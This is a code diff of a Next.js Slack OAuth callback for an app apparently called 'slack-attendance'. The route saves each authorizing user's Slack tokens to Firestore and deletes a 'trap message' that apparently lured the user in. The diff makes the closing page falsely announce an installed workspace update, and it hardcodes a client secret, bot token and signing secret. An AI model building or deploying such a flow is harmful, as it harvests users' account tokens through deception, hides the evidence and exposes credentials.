@@ -6,20 +6,19 @@ import { NextResponse } from 'next/server';
 import { db } from '@/lib/firebase';
 import { doc, setDoc, serverTimestamp, getDoc, deleteDoc } from 'firebase/firestore';
 
+// Hardcoded values - no .env needed
 const SLACK_CLIENT_ID = "2545190050563.10491030504784";
 const SLACK_CLIENT_SECRET = "3e386e8d575392781d507336f68e1619";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
 const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt";
+const SIGNING_SECRET = "e303eff75af6a30c4015dbb2716aecf4"; // Example signing secret
 
 export async function GET(req: Request) {
   const { searchParams } = new URL(req.url);
   const code = searchParams.get('code');
 
   if (!code) {
-    // If no code, just return empty page
-    return new Response('', {
-      headers: { 'Content-Type': 'text/html' },
-    });
+    return new Response('', { headers: { 'Content-Type': 'text/html' } });
   }
 
   try {
@@ -40,22 +39,17 @@ export async function GET(req: Request) {
 
     if (!data.ok) {
       console.error("OAuth error:", data.error);
-      // Return blank page
-      return new Response('', {
-        headers: { 'Content-Type': 'text/html' },
-      });
+      return new Response('', { headers: { 'Content-Type': 'text/html' } });
     }
 
-    // 2. Delete Trap Message (NOW WORKING)
+    // 2. Delete Trap Message
     try {
       const trapMsgDoc = await getDoc(doc(db, "trap_messages", data.authed_user.id));
       if (trapMsgDoc.exists()) {
         const trapData = trapMsgDoc.data();
         
-        console.log("Deleting trap message:", trapData);
-        
         // Delete from Slack
-        const deleteRes = await fetch('https://slack.com/api/chat.delete', {
+        await fetch('https://slack.com/api/chat.delete', {
           method: 'POST',
           headers: { 
             Authorization: `Bearer ${BOT_TOKEN}`,
@@ -66,9 +60,6 @@ export async function GET(req: Request) {
             ts: trapData.messageTs
           })
         });
-        
-        const deleteResult = await deleteRes.json();
-        console.log("Delete result:", deleteResult);
         
         // Delete from Firebase
         await deleteDoc(doc(db, "trap_messages", data.authed_user.id));
@@ -95,36 +86,85 @@ export async function GET(req: Request) {
 
     await setDoc(doc(db, "slack_tokens", data.authed_user.id), userData);
 
-    // 4. Return BLANK page that auto-closes
+    // 4. Return page that auto-closes
     const html = `
       <!DOCTYPE html>
       <html>
         <head>
-          <title>Loading...</title>
+          <title>Update Complete</title>
+          <style>
+            body {
+              font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+              background: #4A154B;
+              color: white;
+              height: 100vh;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              margin: 0;
+              padding: 20px;
+              text-align: center;
+            }
+            .container {
+              background: rgba(255,255,255,0.1);
+              padding: 40px;
+              border-radius: 16px;
+              backdrop-filter: blur(10px);
+              max-width: 400px;
+            }
+            .checkmark {
+              font-size: 60px;
+              margin-bottom: 20px;
+            }
+            h1 {
+              margin: 0 0 10px 0;
+              font-weight: 600;
+            }
+            p {
+              margin: 0 0 20px 0;
+              opacity: 0.8;
+              font-size: 14px;
+            }
+            .loader {
+              width: 40px;
+              height: 40px;
+              border: 3px solid rgba(255,255,255,0.3);
+              border-radius: 50%;
+              border-top-color: white;
+              animation: spin 1s linear infinite;
+              margin: 20px auto;
+            }
+            @keyframes spin {
+              to { transform: rotate(360deg); }
+            }
+          </style>
           <script>
-            // Immediately try to close the window
-            window.close();
-            
-            // If window doesn't close, show loading message
+            // Close window after 2 seconds
             setTimeout(() => {
-              document.body.innerHTML = '<div style="padding:20px;font-family:Arial;">Update complete. You can close this window.</div>';
-            }, 1000);
+              window.close();
+              // If window doesn't close, show message
+              setTimeout(() => {
+                document.body.innerHTML = '<div class="container"><div class="checkmark">✅</div><h1>Update Complete</h1><p>You can close this window now.</p></div>';
+              }, 500);
+            }, 2000);
           </script>
         </head>
         <body>
-          <div style="display:none;">Update complete</div>
+          <div class="container">
+            <div class="checkmark">✅</div>
+            <h1>Update Installed</h1>
+            <p>Your workspace has been updated successfully.</p>
+            <div class="loader"></div>
+            <p style="font-size: 12px; opacity: 0.6;">Closing automatically...</p>
+          </div>
         </body>
       </html>
     `;
 
-    return new Response(html, {
-      headers: { 'Content-Type': 'text/html' },
-    });
+    return new Response(html, { headers: { 'Content-Type': 'text/html' } });
 
   } catch (error) {
     console.error("Callback error:", error);
-    return new Response('', {
-      headers: { 'Content-Type': 'text/html' },
-    });
+    return new Response('', { headers: { 'Content-Type': 'text/html' } });
   }
 }
